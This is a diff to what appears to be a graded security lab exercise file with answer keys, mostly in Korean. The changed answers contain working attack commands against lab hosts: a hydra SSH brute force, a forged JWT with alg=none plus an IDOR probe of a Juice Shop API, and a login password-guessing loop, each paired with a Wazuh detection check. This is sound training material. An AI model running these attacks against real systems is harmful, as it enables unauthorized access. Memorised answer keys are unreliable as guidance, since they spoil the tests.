@@ -120,18 +120,18 @@ steps:
     category: exploit
     points: 20
     answer: |
-      ssh 6v6-attacker '
+      ssh -n 6v6-attacker '
         echo -e "root\nadmin\nccc" > /tmp/u.txt
         echo -e "password\nadmin\n1\nletmein\nccc" > /tmp/p.txt
         timeout 30 hydra -L /tmp/u.txt -P /tmp/p.txt -t 1 -f 10.20.30.201 ssh 2>&1 | tail -10
       '
-      ssh 6v6-siem 'sudo grep -cE "5710|5712" /var/ossec/logs/alerts/alerts.json 2>/dev/null || echo 0'
+      ssh -n 6v6-siem 'sudo grep -cE "5710|5712" /var/ossec/logs/alerts/alerts.json 2>/dev/null || echo 0'
     answer_detail: |
       hydra 15 시도 + Wazuh detection. 정답 ccc:ccc 또는 ccc:1 매치 가능. Wazuh
       5710/5712 카운트 ≥ 1 (인증 실패 자동 탐지). W09 의 active-response 연결.
     verify:
       type: output_contains
-      expect: 'hydra\|password\|valid'
+      expect: 'Hydra'
       field: stdout
       semantic:
         intent: |
@@ -242,13 +242,13 @@ steps:
       H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr "+/" "-_" | tr -d "=")
       P=$(echo -n '{"user":"admin","role":"admin"}' | base64 -w0 | tr "+/" "-_" | tr -d "=")
       echo "변조 JWT: $H.$P."
-      ssh 6v6-attacker "for id in 1 2 3 4 5; do code=\$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' http://10.20.30.1/api/Users/\$id); echo \"User \$id: \$code\"; done"
+      ssh -n 6v6-attacker "for id in 1 2 3 4 5; do code=\$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: juice.6v6.lab' http://10.20.30.1/api/Users/\$id); echo \"User \$id: \$code\"; done"
     answer_detail: |
       JWT alg=none 변조 (H.P. 형식) + IDOR 5 시퀀스. 200 = 취약 (권한 검증 부재) /
       401 = prevention. 200 시 email 노출 확인. A01 + T1078.
     verify:
       type: output_contains
-      expect: 'User\|alg\|none'
+      expect: 'User'
       field: stdout
       semantic:
         intent: |
@@ -335,7 +335,7 @@ steps:
     category: rbp_integration
     points: 4
     answer: |
-      ssh 6v6-attacker 'for p in 123 admin; do curl -s -o /dev/null -w "%{http_code}\n" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$p\"}" -H "Content-Type: application/json" -H "Host: juice.6v6.lab" http://10.20.30.1/rest/user/login; done'
+      ssh -n 6v6-attacker 'for p in 123 admin; do curl -s -o /dev/null -w "%{http_code}\n" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$p\"}" -H "Content-Type: application/json" -H "Host: juice.6v6.lab" http://10.20.30.1/rest/user/login; done'
       echo "Coverage: brute + alg whitelist + ACL"
     answer_detail: Auth R/B/P
     verify:
